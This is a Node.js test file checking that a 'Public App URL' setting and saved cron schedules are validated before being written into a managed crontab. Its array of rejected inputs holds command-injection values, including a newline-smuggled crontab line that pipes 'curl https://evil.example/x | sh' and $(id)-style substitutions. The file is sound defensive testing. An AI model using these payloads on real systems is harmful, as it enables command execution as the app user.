import assert from 'node:assert/strict'
import test from 'node:test'

import { isSafePublicBaseUrl, normalizePublicAppUrl } from '@/lib/domain/settings/public-app-url-input'
import { buildOtiCrontabBlock, validateCronSchedule, type CrontabJobDef } from '@/lib/crontab-sync'

// The Public App URL is written into the managed crontab as BASE_URL="<url>/api/cron". A value that
// carried a newline used to be stored raw (only the parsed form was checked) and became a new crontab
// line, run as the app user. These pin the write-side validation and the render-side refusal.

const JOB: CrontabJobDef = { slug: 'ping', settingKey: 'ping', label: 'Ping', defaultSchedule: '*/5 * * * *', defaultEnabled: true }
const INJECTED = [
  'https://ims.example.com\n* * * * * curl https://evil.example/x | sh',
  'https://ims.example.com\r\n* * * * * id',
  'https://ims.example.com"; curl https://evil.example #',
  'https://ims.example.com/$(id)',
  'https://ims.example.com/`id`',
  'https://ims.example.com/a b',
  'https://ims.example.com/a%0Ab',
  'https://user:pass@ims.example.com',
  'https://ims.example.com/?x=1',
  'https://ims.example.com/#frag',
  "https://ims.example.com/'x",
  'https://ims.example.com/a\\b',
  'http://ims.example.com',
  'ftp://ims.example.com',
  'https:example.com',
  'https:/example.com',
  'https:///example.com',
  'https:\\\\example.com',
]

test('the write-side rule refuses every injected or unsafe Public App URL', () => {
  for (const value of INJECTED) {
    assert.equal(normalizePublicAppUrl(value).ok, false, JSON.stringify(value))
  }
})

test('the write-side rule still accepts ordinary public URLs', () => {
  for (const value of ['https://ims.example.com', 'https://ims.example.com/', 'https://ims.example.com:8443/app', 'http://127.0.0.1:3000', 'http://localhost:3000/']) {
    const result = normalizePublicAppUrl(value)
    assert.equal(result.ok, true, value)
    if (result.ok) assert.equal(result.url, value.replace(/\/+$/, ''))
  }
})

test('the crontab renderer refuses a stored bad URL instead of splicing it into the block', () => {
  for (const baseUrl of INJECTED) {
    const block = buildOtiCrontabBlock({
      jobs: [JOB],
      settings: new Map(),
      secretRef: { kind: 'env-file', envFilePath: '/etc/ims/.env' },
      baseUrl,
      logPath: '/var/log/ims/cron.log',
      heartbeats: null,
    })
    assert.equal(block.ok, false, JSON.stringify(baseUrl))
  }
  assert.equal(isSafePublicBaseUrl('https://ims.example.com'), true)
})

test('a saved schedule carrying a newline cannot reach the crontab', () => {
  assert.equal(validateCronSchedule('*/5 * * * *\n* * * * * id').ok, false)
  assert.equal(validateCronSchedule('* * * * *\n').ok, false)
  assert.equal(validateCronSchedule('*/5 * * * * id').ok, false)
})

test('the parser-tolerant forms `https:example.com` and `https:/example.com` are refused on write and at render', () => {
  for (const value of ['https:example.com', 'https:/example.com', 'http:127.0.0.1:3000', 'http:/localhost']) {
    assert.equal(normalizePublicAppUrl(value).ok, false, value)
    assert.equal(isSafePublicBaseUrl(value), false, value)
  }
})

test('the stored form is the parser canonical form, not the raw text', () => {
  const result = normalizePublicAppUrl('  HTTPS://IMS.Example.com/app/./x/../  ')
  assert.deepEqual(result, { ok: true, url: 'https://ims.example.com/app' })
})
